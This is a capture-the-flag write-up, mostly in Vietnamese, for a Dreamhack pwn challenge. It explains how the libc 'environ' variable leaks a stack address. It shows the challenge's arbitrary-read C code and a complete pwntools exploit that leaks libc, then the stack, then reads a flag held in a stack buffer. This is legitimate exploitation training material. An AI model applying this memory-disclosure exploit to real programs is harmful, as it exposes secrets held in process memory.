# Environ
## 0.Theory
- Biến environ (trong libc):
Đây là biến toàn cục nằm sẵn trong libc. Bản thân ô nhớ của environ nằm ở vùng nhớ data/bss của libc, nhưng giá trị (value) được lưu bên trong ô nhớ đó lại là một địa chỉ tuyệt đối trỏ thẳng lên Stack (nơi lưu các biến môi trường của tiến trình).
## 1. Idea 
Trong đề có : 
'''c
void read_file() {
  char file_buf[4096];

  int fd = open("./flag", O_RDONLY);  //<---đọc flag vào buffer rồi đưa lên stack 
  read(fd, file_buf, sizeof(file_buf) - 1);
  close(fd);
}
'''
-nhiệm vụ của ta là : leak libc base -> leak environ address -> leak stack address -> flag address
-hàm phục vụ cho ta làm được điều đó là :

 '''c
 while (1) {
    printf("> ");
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        printf("Addr: ");
        scanf("%ld", &addr);
        printf("%s", (char *)addr);
        break;
      default:
        break;
    }
  }
'''

## 2 script
'''python
#!/usr/bin/env python3
from pwn import *

exe = ELF('environ_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

s= lambda data : p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b *main +0xba
            
        ''')
        input()

if args.REMOTE:
    p = remote('host3.dreamhack.games', 14761)
else:
    p = process(exe.path)


GDB()

p.recvuntil(b'stdout: ')
stdout_address= int(p.recvuntil(b'\n',drop =True),16)
log.info("stdout address: " + hex(stdout_address))
libc.address = stdout_address -0x21a780
log.info("libc address: " + hex(libc.address))
environ = libc.address +  0x221200
sla(b'> ',b'1')
input()
sla(b'Addr: ', str(environ).encode())
stack_address=u64(p.recv(6) + b'\x00\x00')
flag_address =  stack_address- 0x1568

log.info("stack address: " + hex(stack_address))
log.info("flag address: " + hex(flag_address))
sla(b'> ',b'1')

sla(b'Addr: ', f'{flag_address}'.encode())
p.interactive()

'''
